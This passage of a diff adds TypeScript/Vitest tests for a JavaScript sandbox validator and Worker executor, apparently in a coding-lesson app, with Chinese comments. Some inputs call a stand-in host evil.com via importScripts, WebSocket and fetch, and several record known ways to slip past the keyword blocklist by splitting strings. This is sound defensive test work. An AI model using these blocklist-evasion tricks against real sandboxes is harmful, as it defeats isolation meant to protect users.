@@ -1,0 +1,99 @@
+    it('should allow arithmetic and variables', () => {
+      expect(validateJavaScriptSandbox('let x = 5; let y = x + 3; console.log(y);')).toBeUndefined()
+    })
+
+    it('should allow function declarations but block the Function constructor', () => {
+      // 回归：/i 的 Function 曾误杀 function 关键字声明
+      expect(validateJavaScriptSandbox('function add(a, b) { return a + b; }')).toBeUndefined()
+      expect(validateJavaScriptSandbox('const f = new Function("return 1");')).toBeDefined()
+      expect(validateJavaScriptSandbox('eval("1 + 1")')).toBeDefined()
+    })
+  })
+
+  /* ---------------------------------------------------------------
+     R4 G.3 第 4 条：明确主线程正则是“提示性检查”，不是安全边界。
+     这些用例记录已知绕过形态——它们说明为什么真正的隔离必须依赖 Worker。
+     --------------------------------------------------------------- */
+  describe('R4：正则只是提示，不是安全边界（已知绕过形态）', () => {
+    it('构造字符串拼接可绕过关键字黑名单（记录为已知限制，由 Worker 隔离兜底）', () => {
+      // 关键字不出现在源码中：证明正则不能作为安全边界。
+      expect(validateJavaScriptSandbox('const k = ["fe", "tch"].join(""); void k')).toBeUndefined()
+    })
+
+    it('动态属性访问可绕过（记录为已知限制）', () => {
+      expect(validateJavaScriptSandbox('const key = "ev" + "al"; const g = ({}).constructor; void key; void g')).toBeUndefined()
+    })
+
+    it('直接书写的敏感能力仍会被提示性拦截', () => {
+      expect(validateJavaScriptSandbox('importScripts("https://evil.com/x.js")')).toBeDefined()
+      expect(validateJavaScriptSandbox('new WebSocket("wss://evil.com")')).toBeDefined()
+      expect(validateJavaScriptSandbox('indexedDB.open("x")')).toBeDefined()
+    })
+
+    it('拦截信息显式标注为提示性检查，不宣称绝对安全', () => {
+      const error = validateJavaScriptSandbox('fetch("/x")')
+      expect(error?.message).toContain('提示性检查')
+    })
+  })
+
+  describe('executeJavaScript', () => {
+    let revokeObjectURL: ReturnType<typeof vi.fn>
+
+    /** 只建 Worker、永不回报任何消息的桩：用来验超时兜底真的会 terminate。 */
+    class SilentWorker {
+      static instances: SilentWorker[] = []
+      onmessage: ((event: { data: WorkerOutbound }) => void) | null = null
+      onerror: ((event: { message: string; lineno?: number }) => void) | null = null
+      terminated = false
+      constructor(_url: string) {
+        SilentWorker.instances.push(this)
+      }
+      terminate() {
+        this.terminated = true
+      }
+    }
+
+    beforeEach(() => {
+      FakeWorker.instances = []
+      SilentWorker.instances = []
+      lastWorkerSource = ''
+      vi.stubGlobal('Worker', FakeWorker as unknown as typeof Worker)
+      vi.stubGlobal('Blob', FakeBlob as unknown as typeof Blob)
+      revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => {})
+      vi.spyOn(URL, 'createObjectURL').mockReturnValue('blob:mock-worker')
+    })
+
+    afterEach(() => {
+      vi.unstubAllGlobals()
+      vi.restoreAllMocks()
+    })
+
+    it('should execute simple console.log through the worker protocol', async () => {
+      const result = await executeJavaScript('console.log("Hello World")', mockLesson)
+
+      expect(result.output).toEqual(['Hello World'])
+      expect(result.error).toBeUndefined()
+      expect(FakeWorker.instances).toHaveLength(1)
+    })
+
+    it('should reject blocked patterns before starting a worker', async () => {
+      const result = await executeJavaScript('fetch("https://evil.com")', mockLesson)
+
+      expect(result.error).toBeDefined()
+      expect(result.error?.message).toContain('沙箱禁止')
+      expect(FakeWorker.instances).toHaveLength(0)
+    })
+
+    it('should terminate the worker and release the object URL when done', async () => {
+      await executeJavaScript('console.log("done")', mockLesson)
+
+      const worker = FakeWorker.instances[0]!
+      expect(worker.terminated).toBe(true)
+      expect(revokeObjectURL).toHaveBeenCalledWith('blob:mock-worker')
+    })
+
+    it('should time out long-running code and terminate the worker', async () => {
+      vi.useFakeTimers()
+      vi.stubGlobal('Worker', SilentWorker as unknown as typeof Worker)
+
+      const promise = executeJavaScript('while (true) {}', mockLesson)
